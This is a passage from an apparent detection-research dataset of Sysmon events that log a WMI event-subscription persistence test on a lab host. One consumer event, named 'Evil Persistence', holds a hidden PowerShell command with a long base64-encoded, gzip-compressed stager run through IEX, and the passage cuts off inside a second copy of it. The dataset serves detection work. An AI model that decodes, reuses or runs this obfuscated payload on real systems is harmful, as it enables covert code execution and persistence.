'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325\"</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "19",
        "Timestamp": "2021-06-16T21:47:37.969650700Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-host-14.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "19",
          "Version": "3",
          "Level": "4",
          "Task": "19",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2021-06-16T21:47:37.969650700Z"
          },
          "EventRecordID": "151831",
          "Correlation": "",
          "Execution": {
            "ProcessID": "1972",
            "ThreadID": "3648"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-host-14.attackrange.local",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "-",
          "EventType": "WmiFilterEvent",
          "UtcTime": "2021-06-16 21:47:37.961",
          "Operation": "Created",
          "User": "WIN-HOST-14\\Administrator",
          "EventNamespace": "\"root\\\\CimV2\"",
          "Name": "\"AtomicRedTeam-WMIPersistence-Example22\"",
          "Query": "\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\""
        }
      }
    },
    "20": {
      "event_id": "20",
      "length": 8303,
      "source_file": "datasets\\attack_techniques\\T1546.003\\wmi_event_subscription\\windows-sysmon.log",
      "event_index_in_file": 11,
      "raw": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>20</EventID><Version>3</Version><Level>4</Level><Task>20</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-06-16T16:33:04.949818200Z'/><EventRecordID>68998</EventRecordID><Correlation/><Execution ProcessID='1972' ThreadID='3040'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-host-14.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>WmiConsumerEvent</Data><Data Name='UtcTime'>2021-06-16 16:33:04.949</Data><Data Name='Operation'>Modified</Data><Data Name='User'>WIN-HOST-14\\Administrator</Data><Data Name='Name'> \"Evil Persistence\"</Data><Data Name='Type'>Command Line</Data><Data Name='Destination'> \"powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA3AFYAWAA2ADMATwBpAFMAaABiAC8ASABQADgASwBQAHEAUgBLAHIAVABGAGUARgBaAE4ASgBaAGkAdABWAEEAeQBJAEsAUQBhAEwAaQBPAHoAZQBWAGEAcgBwAGIAZwB2AEkAUwBHAGcASAB2AHoAUAArACsAQgA5AFQAYwB6AEUANQBtAGQANgBwADIAMQB5AHIASwBmAHAAegBuADcAegB3ADQARwBKAFIAZABHAFMAeQAwAE0AUgB2ADQAaABIAEoAWABNAHgAcABHAHQAdQA5AHgAcgBWAEwAcABVAHYASQBWAHgAdAAxAHoAWAA4AHUAbABkAGUAeABoAGwAaAAvAG4AaQB4AGUATABzAHAAYwBnADkAUABFAEwASQBpAFMAawBVAGMAVAA5AFYAYgBvAFkAbwBoAEMANQBYAE8AVgB5AGoAOABJAFgAMQB5AGUAeABRADIAdABjAHMAYwBrAEoASwBZAGwARABXAHIAMgA0AEsARgAwAFUAUgA3AEUAWABvAFQAVgA5ADgAUgBDAHoAOQAvAFQARgBwAGUAegBWAEoAeABFAG8AcQBqAHcASgBRAFMARAA1AEwAcgBLADkANQB5ADkAZgBPAG4ARQBZAFUAbwA4AGQAOQAvAFUAZQBaAFUASQBVAFUAZABkADAAYgBCAHAAVgBxAHQAdwAzAGIAdgA1AEsAUQAzAHIAMQBhAEcANABvAFoAdAB4AGYAMwBPAFYATAB2AGUAZgA0AEoAbgBKAE8AWgBGAGsASAA0AFYAZAB3AFMAUABCAEkAZgBxAGYANQBHAE8AVQBlADEASQAzAEEAcwBWAG0AbAAvAE8AZQBmADUAZQByAFQAVgBmAE8ANQAzAHQAMwBGAHkASQBrAHEAWgBTAE8ATABHAEgAWAByAHgASABIAEsAVgBlADUANwBOAFYAYwA0AHkAUQBKAGEASwBRADkAcwBIAFAAcQBSAHYAMgBiADEAdQBlADMAeAByAGYAcQAwAHMARgA0AHYAagBCADgAYwBiAFMAOQBYAFQANQA1AFoAQQBRAEkALwBmAHUAMQBrAEwAdgBYAEkAVQB5AG4ARABjAGcAagBZAEMARQBjAE0AeQB6AFgAdQBLAGQAZgAzADkAUAB6AE0AZgBYADIAegBaAGgAeAA3AHoASABaAHAAWABmAEUAWQBEAGYAMwBBAG8ATwBIAGUAeABqAFMAcQA5ADUARgBIAEgARABxAG0AYQAyAEEAcgBSAHgAQQArAHoAeQBwAFgAdwBZAGkAUQBzAGoAagAwAHUATABNAHQAdwBMAGYAMwB0ADcAUgB5ADYAYwBXAE8AVQB3AE8ANQBUADcAOAByADkANwBtAGkAMAArAFEATQA3AHUAOAB5AFYAZAA0AHoAQQBkAFcAUQBoAGQAWABhAEsAUwBkACsAQgA0ADUAQgBrAFQAZABIAGMAZQBEAE8AVAA5AGEALwBTADYANABxAC8ASAA1AEsAcwBHAHIAcABlACsAbQBEAFYAQwBYAFUAbwBSAFoAaQA5AEkAVQBCAHYAdQA5AHkAdABYAFIAeAA4AFYAUQBzAEsAZgBoAFQARwBmAHEAUgBYAGYARABkAGMANAAwAGEATgB3AEEAagBFAFAAUABEAEwAQQAvAG4ASgBJAHgAcAA5AGYAbgB2ACsAQgB6AFYAbgBqAG0AagAyAGkAOABGAE4AYwA5AGMASgA1ADUAagBlAEkANQAyADMASABOAFAATQA5ADgAbQB6ADYAVwBMAGEAdQBtAFUAUABmAG4ANQBpAHgAbgBiAEQAcQBGAGgAZgB2AC8AcgBhAHAARABvADIAdgBhAG8AbABIAG4ASQB0AGYARQA1ADQAUwBzAGYAeABZAHkAdQBIAFYAcgBnAFUAVAArAFQANgBXAEIAbgBwAFgAeQA2AG8ARQBRADYAbwBWAFAATwBBAFgAMwA2AG0AYQAzAHIAMgB1AHkATgBWAHoAdwBhAEoAMgBDAEkAZQB3AFIAVwBRAFUAcABVAGYAegBUAG0ARwBNAE4ASwBXAGYARQBHADEAQQBYADgAagBuAHQASQAwADgAcwAxAGwAQgBrADkAVQA1ADkASwBLAHoAdAByAHoALwBkADUATABuAGMAYwBGAEUAVQAxAGIAaABoAEQAbgBlAE0AYQBaADEARABrAFUARgBMAGoAQgBDACsAeQBUADEAZABDAHoAUAB4AGkAVwBmADcAYgAzAEUASABzAE0AQgB1AGoAaQBKADMARgBQAFYAYwAvAGcAUABTAGsAdQB1AE4ANwBVAEQARQB4AGgAdQBnAEMARABCAE0AagBvAE4AaABHAFQAbwA1AEsAagBlAHYAYgBoAEkAcQBaAFkAVgB0AG4ARQA4AG8AZgBZAHQASgBCAGoAZwBNAGwAQgA1AEwAMgBFAEIATQA0AHkAYgBFAHcAVwBKADQAegBJAGEAbgA5AGEAMwA1AFUANgB3AFoAbABpAGgAcwA0ADEAQQBYAHEAbwBnAHYASgBEAHIASwBnADUANQB3AHEAcQBrAGcAMwBaAEYARgBTAC8AagBkAG0AbgArAHYAawBXAEIAUQA1AFYAbQBlAFEAMwBoAGsATgBDAFcAQQA0AFAAcQB0AHgATQB6AHQAawAwAE4AZgBLAHQAWgA4AFMANwA3ADgAegA3ADgAYwBXADgANABPAFoAbgBaAEMAZQBBAGwAawBwAEMAdgBGAEoAegBGAGgAZQBMAGcAVQBsAHoAbAA4AHUAOQAyADkAWQBGAHMAaQBGAEQARgBDAFQAUQA5ADgAVgBVAFUAUgB2ADIAawBiAFIAeABpAHAAbAAvAGoAYgBlAEsAZABsAGcATQA3AG8ASgBlADkAMgA5ADMATgAvADEAdQB4AE4ANAA5AHYARAB3AE8ANwBtAHIAYQBlAG8ANABFAE0AYwBhADcAcwBhAFAAdwAzADUARABYAFMAdQBqAFcANgBrAGQASgA3AEUAUwBUADgAUQBHAEwAegBlAEEANwByAEQAcgBkAGQAZgBLAC8AdABGAGYATgBtAE8AMwAzAFMAUwBCAHMAdABmAGgATABQAHEAOAA2ADAAZQBTAHMAcABlAEUAZgBtAHYAbgB5AHoAZQBXAGYAWABlAFMAYwArAFEAZgBtAFUAbgBUAFgAQwBqAHkAWgA3AE0AbgB0AC8AdQB6AFMATQA3AHAAKwA4AHAAZQBsAEgAZQBkAE8AeAAvAFcAZgB5AGoANwBqAHEAOABDADMAKwAxAE4ANABJAGsASgBhAGQATwB1AGUAawBNAFgARwBrADUANABkAGsAdQBSAGwAVwBZAFAAcwAwADkARwBvADkAbQBiAFoAYgBvADIANgB3AGEANgA0AFIASABOAGIASQA1AGsAVgBUACsAMABNAHYAQQBKAC8ARABMADQALwByAGgAQgA0AEQARgBTAHAAegBuADMASgAvAGcAdQAyAHYAVgB6AGYANgBtAG8ANwBiAEMAbgBxAGsAcABmAHoAWQB4AHIAeQAxAFkAeQBQAGMARQBOADEAdABpAEYAQgA0AGMAZgByAGcANwBaADcAaABiADQAOQBUAFoAZwBrAGgAcgBaAFkATgB5ACsASQBTAGwAZQB5AEEAbABlADYARgByAFcAWAArAG8AOQAwAEwARwBMADUAMQBhADcAcgAyAHQAKwBLAG0AeQBVAG0AMQBBAHkARABIAEkAdwBKAG0AbgBUAGEASwA2AGMAUABWAHIAZwBPAHkAOABwADkAQgBzAGsAVABjAGcAMABlAGwAUQBuAGIATQBrAFAAawBkAHYATwBNAHUALwBHAFUARABaAEsAcQB1AEcAQQB6AFIAYgBxAFQAWQBpAHkAVABxAEQAWgAxAEIAVABYAEwASgBlAHIAYQBpAHQATAB2AGUAdgBDAHUAcwB2AFMAaABtAEcATQBNAHcASgA2AG4AZgA1AEUAZQBnAEMAOQBYAG0AYwB3AEEAQgAvAFEAdABiAHoAYwBVAG4ANwA0AE0ATgBjAFAAbQBCAGMAMQBuAEkAVQBLACsARABGADgAdQBMAEYAQgA5AGkAMABiADgASABBAHUAeQBjAHEASQBUAEwAcwBiADIAVQAwADYATwBGAGwAdABsAHAANwBlAGwAdgBtADcAQQAxADEARQBjAHoAbABoAGgALwBYAEkAbgB5ADUANwB3AG8ATQBNAE0AVgBpADUAZwBiAFgAMAB1AG8AKwA0AFQAMgB4AHoAVABtAHcAOAB4ADQAOQBMAHQAOABrAGoAYgA3AGIARABpADEAVQBpAGUAYwBUAEYAZgBmAHkANABtAGcAZgA3AGwAYQBYADAAVQBmAEkAYQBkAG8AegBCADMAQgBUAFUAZwAyAGoAcgByAFcAbAAzAE4AWgBaAGMAdABUAHYAZQBOAGgAZQA5AGsAUgA1AFAAWgBPAGQAaAAwAHIAagByAFMATwBKAFMANwB5AFkARABiAGQAUgBOAEgANgBjAE4AZABXAEYAcwA1AGUASAA0ADEAWgBKAE0AVAA5AHkAdAByAEEARwBTAHgAbwBPAGwAdwBJADgAZgBKAGwATQB5AG0ATQBtAEMAWgBDADcAQQA3AEYASABEADYAQQBsADYAdwA5AGcAMgBaAG4ASgBxAFMAZgBOADAAdQBvAEEAOQBQADUAMABHAC8AVgB4ACsASQBSAFAATwBUAFYAZQBOAHUAeQBNAC8AZgBqAGoAYgA0AGUAbwAyADUAcQAzAEYAbQB0AGUAdgBhAGIAcABjAGQASABqADkAcgB2AE0ANgB0AHAAYQBDAFAAMQAxAFkAeABFAFcAdQBhAE8AUABSAGQAVQBKAGEASwBsAHUAMQAxAEgAUwBWAFgATgB2AG0AZwB1AHoASQBQAEUAaQBKAEoAegB5AFMAMQBpAG8AaAB5AGIAVwBEADMARAB0AFgAcwBFAGoAWQA2AFUAVwBxAGsAcQA0AGkAdwBSAHYAMABsAGkAMwAxAFEARQBYAHkAQgArAGEAZAB6AC8ASQByADEAagBEAGYAZQBKAEIANwBvAGcAWAB5AHEAZABoAGEANwBaAFkAOQBOAFoAVQA4AGsAUQBmAE0AdgBLAFUAbgBlADQAQQBGAEkANgAyAGcAaQBUAHkANQBoAFkAVgByAGYAZwBWADMAawBqAHYAYgBtAGEAMQBsAFIAMgB4AEYAQwBrAHEAMgAvACsAZQA0AEsAQgB2AGoANwBuAEYAdQBMAFMAQQBYAHQAOAA0AEcAOAB2AGcAQQBPAGEAMwBCAHMAMQBIADQAcwBVAGIAYgBKAEUAawBoAHgAeQBMAFYAegAyAHQAbABvACsAeQBEAEQARAArAEUAWABkAEsATgBOAGcATABzAGMAWAArAG0ARABjAHoANQBMAGkARwBIAFYAaABEAHIAaQAyAHQAawBiAFoAVwA0AEEAegBWAHUAOQB1AGcAbgBTAGQAdQB4AHoANQBqAHYAWAB2AGUAbQBVADEARQBiAGIAWgB0ADkAdwAzAEYANgAwAGwAVABzAHoAQgBwAE8AWgA3AEsAZAA5AGEAWQB5ADEAdgBPAFkASwA4AGQAYQB2AE0AOAA3ADIAdABvAFAAWQBVAFoASgA4AC8AZgArAFAAegBqADQAdgAzAEkAWQA5ADkAYQB6AG8ARgBOAEIARQA4AHoAUABQADMAMgBxADUAcgBQAEQAMgA4ADMAVABaAGYAcAA4AG4AdgBYAGUAOQBsAGQAbQBDAHQATAA0ADYANwB6AC8ARgBUAGQANwA5AEsANwByAC8AVwBxAEEARwBxAEEAdwBlAGsAVQBPAGQARQBNAFkAZwBzADYAdgBNAE4AawBQADUAZABNAG8ATQAvAFQAdABuAEsATgBTACsAWABqADYAMwB0AEwAUQBvAHcANQBNAHAAagBDADcAbgBoAHUALwA0AEQAZwArAHoAbwBlAHYAWAAwAHgAQgBNAEEAbwBlAEIANwBSAG4AZQBNAEYATgBZAGMAbQAzAFAAbAB4AFYAdQBUAGQAQwBtAEwAaQBPAFAAcABuAHgAZQBsADAATQBLAEMAYwBQAHoAMwBQAGEAbQBmAEQATABsAHgAVwA0AFYAMwBzAEgAbwBrAFkAOQBpADcAMwBXAHUARQBiAEsATgB4AHEATgAvAEwALwBkAHEASgBaACsASAA1AGEATwBIADIAUwBWAE4AMwBHADEAZgBFAEIANwBaADgAbAA3AFQAVQA2AGgAcQBYAHAAQwBQADQAdwA5AGwALwA0AFAAQQAvAEMARAAwAHYAOABNAGIAUQA1AGUATQBlAE8AOQBRAFYAYwBZADkARABGAGUAMQBWAEwANQBhADYAbQBrAHIATABsADMANQA1AEYAOQBnAEMAOABZAHUAdQBOAHUAaQA5AHkATABHAEEAcgBaADEAYwBZADMANABYAE8AbgBlAEgAOQBYAEwAbABHAFYAVQA3AG8ATAA3AGgASgB4ADMANwBrAHIAYwBFACsASQArAEIAWgA4ADgANABSAFcAbgBMAC8ATQB1AGUATQBuADMARABjAHUAUQBmAGEAUgA4AFIAcwAzAHAAcABqAEMAQwBIADYAbAArAGkAWgBrAEsAWQBXAFoATABCAGQAZABDAE0AbQBKADQAZQB5AGYAMABuADQAUwA5AGgATQBPAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=\"</Data></EventData></Event>",
      "parsed": {
        "SourceName": "Microsoft-Windows-Sysmon",
        "EventCode": "20",
        "Timestamp": "2021-06-16T16:33:04.949818200Z",
        "LogName": "Microsoft-Windows-Sysmon/Operational",
        "ComputerName": "win-host-14.attackrange.local",
        "System": {
          "Provider": {
            "Name": "Microsoft-Windows-Sysmon",
            "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          },
          "EventID": "20",
          "Version": "3",
          "Level": "4",
          "Task": "20",
          "Opcode": "0",
          "Keywords": "0x8000000000000000",
          "TimeCreated": {
            "SystemTime": "2021-06-16T16:33:04.949818200Z"
          },
          "EventRecordID": "68998",
          "Correlation": "",
          "Execution": {
            "ProcessID": "1972",
            "ThreadID": "3040"
          },
          "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Computer": "win-host-14.attackrange.local",
          "Security": {
            "UserID": "S-1-5-18"
          }
        },
        "EventData": {
          "RuleName": "-",
          "EventType": "WmiConsumerEvent",
          "UtcTime": "2021-06-16 16:33:04.949",
          "Operation": "Modified",
          "User": "WIN-HOST-14\\Administrator",
          "Name": "\"Evil Persistence\"",
          "Type": "Command Line",
          "Destination": "\"powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA3AFYAWAA2ADMATwBpAFMAaABiAC8ASABQADgASwBQAHEAUgBLAHIAVABGAGUARgBaAE4ASgBaAGkAdABWAEEAeQBJAEsAUQBhAEwAaQBPAHoAZQBWAGEAcgBwAGIAZwB2AEkAUwBHAGcASAB2AHoAUAArACsAQgA5AFQAYwB6AEUANQBtAGQANgBwADIAMQB5AHIASwBmAHAAegBuADcAegB3ADQARwBKAFIAZABHAFMAeQAwAE0AUgB2ADQAaABIAEoAWABNAHgAcABHAHQAdQA5AHgAcgBWAEwAcABVAHYASQBWAHgAdAAxAHoAWAA4AHUAbABkAGUAeABoAGwAaAAvAG4AaQB4AGUATABzAHAAYwBnADkAUABFAEwASQBpAFMAawBVAGMAVAA5AFYAYgBvAFkAbwBoAEMANQBYAE8AVgB5AGoAOABJAFgAMQB5AGUAeABRADIAdABjAHMAYwBrAEoASwBZAGwARABXAHIAMgA0AEsARgAwAFUAUgA3AEUAWABvAFQAVgA5ADgAUgBDAHoAOQAvAFQARgBwAGUAegBWAEoAeABFAG8AcQBqAHcASgBRAFMARAA1AEwAcgBLADkANQB5ADkAZgBPAG4ARQBZAFUAbwA4AGQAOQAvAFUAZQBaAFUASQBVAFUAZABkADAAYgBCAHAAVgBxAHQAdwAzAGIAdgA1AEsAUQAzAHIAMQBhAEcANABvAFoAdAB4AGYAMwBPAFYATAB2AGUAZgA0AEoAbgBKAE8AWgBGAGsASAA0AFYAZAB3AFMAUABCAEkAZgBxAGYANQBHAE8AVQBlADEASQAzAEEAcwBWAG0AbAAvAE8AZQBmADUAZQByAFQAVgBmAE8ANQAzAHQAMwBGAHkASQBrAHEAWgBTAE8ATABHAEgAWAByAHgASABIAEsAVgBlADUANwBOAFYAYwA0AHkAUQBKAGEASwBRADkAcwBIAFAAcQBSAHYAMgBiADEAdQBlADMAeAByAGYAcQAwAHMARgA0AHYAagBCADgAYwBiAFMAOQBYAFQANQA1AFoAQQBRAEkALwBmAHUAMQBrAEwAdgBYAEkAVQB5AG4ARABjAGcAagBZAEMARQBjAE0AeQB6AFgAdQBLAGQAZgAzADkAUAB6AE0AZgBYADIAegBaAGgAeAA3AHoASABaAHAAWABmAEUAWQBEAGYAMwBBAG8ATwBIAGUAeABqAFMAcQA5ADUARgBIAEgARABxAG0AYQAyAEEAcgBSAHgAQQArAHoAeQBwAFgAdwBZAGkAUQBzAGoAagAwAHUATABNAHQAdwBMAGYAMwB0ADcAUgB5ADYAYwBXAE8AVQB3AE8ANQBUADcAOAByADkANwBtAGkAMAArAFEATQA3AHUAOAB5AFYAZAA0AHoAQQBkAFcAUQBoAGQAWABhAEsAUwBkACsAQgA0ADUAQgBrAFQAZABIAGMAZQBEAE8AVAA5AGEALwBTADYANABxAC8ASAA1AEsAcwBHAHIAcABlACsAbQBEAFYAQwBYAFUAbwBSAFoAaQA5AEkAVQBCAHYAdQA5AHkAdABYAFIAeAA4AFYAUQBzAEsAZgBoAFQARwBmAHEAUgBYAGYARABkAGMANAAwAGEATgB3AEEAagBFAFAAUABEAEwAQQAvAG4ASgBJAHgAcAA5AGYAbgB2ACsAQgB6AFYAbgBqAG0AagAyAGkAOABGAE4AYwA5AGMASgA1ADUAagBlAEkANQAyADMASABOAFAATQA5ADgAbQB6ADYAVwBMAGEAdQBtAFUAUABmAG4ANQBpAHgAbgBiAEQAcQBGAGgAZgB2AC8AcgBhAHAARABvADIAdgBhAG8AbABIAG4ASQB0AGYARQA1ADQAUwBzAGYAeABZAHkAdQBIAFYAcgBnAFUAVAArAFQANgBXAEIAbgBwAFgAeQA2AG8ARQBRADYAbwBWAFAATwBBAFgAMwA2AG0AYQAzAHIAMgB1AHkATgBWAHoAdwBhAEoAMgBDAEkAZQB3AFIAVwBRAFUAcABVAGYAegBUAG0ARwBNAE4ASwBXAGYARQBHADEAQQBYADgAagBuAHQASQAwADgAcwAxAGwAQgBrADkAVQA1ADkASwBLAHoAdAByAHoALwBkADUATABuAGMAYwBGAEUAVQAxAGIAaABoAEQAbgBlAE0AYQBaADEARABrAFUARgBMAGoAQgBDACsAeQBUADEAZABDAHoAUAB4AGkAVwBmADcAYgAzAEUASABzAE0AQgB1AGoAaQBKADMARgBQAFYAYwAvAGcAUABTAGsAdQB1AE4ANwBVAEQARQB4AGgAdQBnAEMARABCAE0AagBvAE4AaABHAFQAbwA1AEsAagBlAHYAYgBoAEkAcQBaAFkAVgB0AG4ARQA4AG8AZgBZAHQASgBCAGoAZwBNAGwAQgA1AEwAMgBFAEIATQA0AHkAYgBFAHcAVwBKADQAegBJAGEAbgA5AGEAMwA1AFUANgB3AFoAbABpAGgAcwA0ADEAQQBYAHEAbwBnAHYASgBEAHIASwBnADUANQB3AHEAcQBrAGcAMwBaAEYARgBTAC8AagBkAG0AbgArAHYAawBXAEIAUQA1AFYAbQBlAFEAMwBoAGsATgBDAFcAQQA0AFAAcQB0AHgATQB6AHQAawAwAE4AZgBLAHQAWgA4AFMANwA3ADgAegA3ADgAYwBXADgANABPAFoAbgBaAEMAZQBBAGwAawBwAEMAdgBGAEoAegBGAGgAZQBMAGcAVQBsAHoAbAA4AHUAOQAyADkAWQBGAHMAaQBGAEQARgBDAFQAUQA5ADgAVgBVAFUAUgB2ADIAawBiAFIAeABpAHAAbAAvAGoAYgBlAEsAZABsAGcATQA3AG8ASgBlADkAMgA5ADMATgAvADEAdQB4AE4ANAA5AHYARAB3AE8ANwBtAHIAYQBlAG8ANABFAE0AYwBhADcAcwBhAFAAdwAzADUARABYAFMAdQBqAFcANgBrAGQASgA3AEUAUwBUADgAUQBHAEwAegBlAEEANwByAEQAcgBkAGQAZgBLAC8AdABGAGYATgBtAE8AMwAzAFMAUwBCAHMAdABmAGgATABQAHEAOAA2ADAAZQBTAHMAcABlAEUAZgBtAHYAbgB5AHoAZQBXAGYAWABlAFMAYwArAFEAZgBtAFUAbgBUAFgAQwBqAHkAWgA3AE0AbgB0AC8AdQB6AFMATQA3AHAAKwA4AHAAZQBsAEgAZQBkAE8AeAAvAFcAZgB5AGoANwBqAHEAOABDADMAKwAxAE4ANABJAGsASgBhAGQATwB1AGUAawBNAFgARwBrADUANABkAGsAdQBSAGwAVwBZAFAAcwAwADkARwBvADkAbQBiAFoAYgBvADIANgB3AGEANgA0AFIASABOAGIASQA1AGsAVgBUACsAMABNAHYAQQBKAC8ARABMADQALwByAGgAQgA0AEQARgBTAHAAegBuADMASgAvAGcAdQAyAHYAVgB6AGYANgBtAG8ANwBiAEMAbgBxAGsAcABmAHoAWQB4AHIAeQAxAFkAeQBQAGMARQBOADEAdABpAEYAQgA0AGMAZgByAGcANwBaADcAaABiADQAOQBUAFoAZwBrAGgAcgBaAFkATgB5ACsASQBTAGwAZQB5AEEAbABlADYARgByAFcAWAArAG8AOQAwAEwARwBMADUAMQBhADcAcgAyAHQAKwBLAG0AeQBVAG0AMQBBAHkARABIAEkAdwBKAG0AbgBUAGEASwA2AGMAUABWAHIAZwBPAHkAOABwADkAQgBzAGsAVABjAGcAMABlAGwAUQBuAGIATQBrAFAAawBkAHYATwBNAHUALwBHAFUARABaAEsAcQB1AEcAQQB6AFIAYgBxAFQAWQBpAHkAVABxAEQAWgAxAEIAVABYAEwASgBlAHIAYQBpAHQATAB2AGUAdgBDAHUAcwB2AFMAaABtAEcATQBNAHcASgA2AG4AZgA1AEUAZQBnAEMAOQBYAG0AYwB3AEEAQgAvAFEAdABiAHoAYwBVAG4ANwA0AE0ATgBjAFAAbQBCAGMAMQBuAEkAVQBLACsARABGADgAdQBMAEYAQgA5AGkAMABiADgASABBAHUAeQBjAHEASQBUAEwAcwBiADIAVQAwADYATwBGAGwAdABsAHAANwBlAGwAdgBtADcAQQAxADEARQBjAHoAbABoAGgALwBYAEkAbgB5ADUANwB3AG8ATQBNAE0AVgBpADUAZwBiAFgAMAB1AG8AKwA0AFQAMgB4AHoAVABtAHcAOAB4ADQAOQBMAHQAOABrAGoAYgA3AGIARABpADEAVQBpAGUAYwBUAEYAZgBmAHkANABtAGcAZgA3AGwAYQBYADAAVQBmAEkAYQBkAG8AegBCADMAQgBUAFUAZwAyAGoAcgByAFcAbAAzAE4AWgBaAGMAdABUAHYAZQBOAGgAZQA5AGsAUgA1AFAAWgBPAGQAaAAwAHIAagByAFMATwBKAFMANwB5AFkARABiAGQAUgBOAEgANgBjAE4AZABXAEYAcwA1AGUASAA0ADEAWgBKAE0AVAA5AHkAdAByAEEARwBTAHgAbwBPAGwAdwBJADgAZgBKAGwATQB5AG0ATQBtAEMAWgBDADcAQQA3AEYASABEADYAQQBsADYAdwA5AGcAMgBaAG4ASgBxAFMAZgBOADAAdQBvAEEAOQBQADUAMABHAC8AVgB4ACsASQBSAFAATwBUAFYAZQBOAHUAeQBNAC8AZgBqAGoAYgA0AGUAbwAyADUAcQAzAEYAbQB0AGUAdgBhAGIAcABjAGQASABqADkAcgB2AE0ANgB0AHAAYQBDAFAAMQAxAFkAeABFAFcAdQBhAE8AUABSAGQAVQBKAGEASwBsAHUAMQAxAEgAUwBWAFgATgB2AG0AZwB1AHoASQBQAEUAaQBKAEoAegB5AFMAMQBpAG8AaAB5AGIAVwBEADMARAB0AFgAcwBFAGoAWQA2AFUAVwBxAGsAcQA0AGkAdwBSAHYAMABsAGkAMwAxAFEARQBYAHkAQgArAGEAZAB6AC8ASQByADEAagBEAGYAZQBKAEIANwBvAGcAWAB5AHEAZABoAGEANwBaAFkAOQBOAFoAVQA4AGsAUQBmAE0AdgBLAFUAbgBlADQAQQBGAEkANgAyAGcAaQBUAHkANQBoAFkAVgByAGYAZwBWADMAawBqAHYAYgBtAGEAMQBsAFIAMgB4AEYAQwBrAHEAMgAvACsAZQA0AEsAQgB2AGoANwBuAEYAdQBMAFMAQQBYAHQAOAA0AEcAOAB2AGcAQQBPAGEAMwBCAHMAMQBIADQAcwBVAGIAYgBKAEUAawBoAHgAeQBMAFYAegAyAHQAbABvACsAeQBEAEQARAArAEUAWABkAEsATgBOAGcATABzAGMAWAArAG0ARABjAHoANQBMAGkARwBIAFYAaABEAHIAaQAyAHQAawBiAFoAVwA0AEEAegBWAHUAOQB1AGcAbgBTAGQAdQB4AHoANQBqAHYAWAB2AGUAbQBVADEARQBiAGIAWgB0ADkAdwAzAEYANgAwAGwAVABzAHoAQgBwAE8AWgA3AEsAZAA5AGEAWQB5ADEAdgBPAFkASwA4AGQAYQB2AE0AOAA3ADIAdABvAFAAWQBVAFoASgA4AC8AZgArAFAAegBqADQAdgAzAEkAWQA5ADkAYQB6AG8ARgBOAEIARQA4AHoAUABQADMAMgBxADUAcgBQAEQAMgA4ADMAVABaAGYAcAA4AG4AdgBYAGUAOQBsAGQAbQBDAHQATAA0ADYANwB6AC8ARgBUAGQANwA5AEsANwByAC8AVwBxAEEARwBxAEEAdwBlAGsAVQBPAGQARQBNAFkAZwBzADYAdgBNAE4AawBQADUAZABNAG8ATQAvAFQAdABuAEsATgBTACsAWABqADYAMwB0AEwAUQBvAHcANQBNAHAAagBDADcAbgBoAHUALwA0AEQAZwArAHoAbwBlAHYAWAAwAHgAQgBNAEEAbwBlAEIANwBSAG4AZQBNAEYATgBZAGMAbQAzAFAAbAB4AFYAdQBUAGQAQwBtAEwAaQBPAFAAcABuAHgAZQBsADAATQBLAEMAYwBQAHoAMwBQAGEAbQBmAEQATABsAHgAVwA0AFYAMwBzAEgAbwBrAFkAOQBpADcAMwBXAHUARQBiAEsATgB4AHEATgAvAEwALwBkAHEASgBaACsASAA1AGEATwBIADIAUwBWAE4AMwBHADEAZgBFAEIANwBaADgAbAA3AFQAVQA2AGgAcQBYAHAAQwBQADQAdwA5AGwALwA0AFAAQQAvAEMARAAwAHYAOABNAGIAUQA1AGUATQBlAE8AOQBRAFYAYwBZADkARABGAGUAMQBWAEwANQBhADYAbQBrAHIATABsADMANQA1AEYAOQBnAEMAOABZAHUAdQBOAHUAaQA5AHkATABHAEEAcgBaADEAYwBZADMANABYAE8AbgBlAEgAOQBYAEwAbABHAFYAVQA3AG